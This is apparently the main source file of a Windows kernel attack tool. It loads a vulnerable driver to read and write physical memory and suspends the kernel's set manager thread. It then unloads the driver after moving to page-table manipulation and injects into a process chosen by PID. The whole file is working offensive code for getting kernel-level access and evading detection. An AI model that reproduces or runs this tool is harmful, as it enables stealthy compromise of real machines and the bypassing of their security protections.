#include "vdm_ctx/vdm_ctx.hpp"
#include "ptm_ctx/ptm_ctx.hpp"
#include "injector_ctx/injector_ctx.hpp"
#include "set_mgr/set_mgr.hpp"

int __cdecl main(int argc, char** argv)
{
	if (argc < 3 || strcmp(argv[1], "--pid"))
	{
		std::printf("[!] please provide a process id... (--pid X)\n");
		return false;
	}

	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	// read physical memory using the driver...
	vdm::read_phys_t _read_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::read_phys(addr, buffer, size);
	};

	// write physical memory using the driver...
	vdm::write_phys_t _write_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::write_phys(addr, buffer, size);
	};

	vdm::vdm_ctx vdm(_read_phys, _write_phys);
	ptm::ptm_ctx my_proc(&vdm);

	const auto set_mgr_pethread = set_mgr::get_setmgr_pethread(vdm);
	const auto result = set_mgr::stop_setmgr(vdm, set_mgr_pethread);

	std::printf("[+] set manager pethread -> 0x%p\n", set_mgr_pethread);
	std::printf("[+] PsSuspendThread result -> 0x%x\n", result);

	// read physical memory via paging tables and not with the driver...
	_read_phys = 
		[&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.read_phys(buffer, addr, size);
	};

	// write physical memory via paging tables and not with the driver...
	_write_phys = 
		[&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.write_phys(buffer, addr, size);
	};

	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	vdm.set_read(_read_phys);
	vdm.set_write(_write_phys);

	ptm::ptm_ctx target_proc(&vdm, std::atoi(argv[2]));
	nasa::injector_ctx injector(&my_proc, &target_proc);

	if (!injector.init())
	{
		std::printf("[!] failed to init injector_ctx...\n");
		return -1;
	}

	const auto ntdll_base = 
		reinterpret_cast<std::uintptr_t>(
			GetModuleHandleA("ntdll.dll"));

	const auto ntdll_base_injected = injector.translate(ntdll_base);
	std::printf("[+] ntdll base -> 0x%p\n", ntdll_base_injected);
	std::printf("[+] press any key to close...\n");
	std::getchar();
}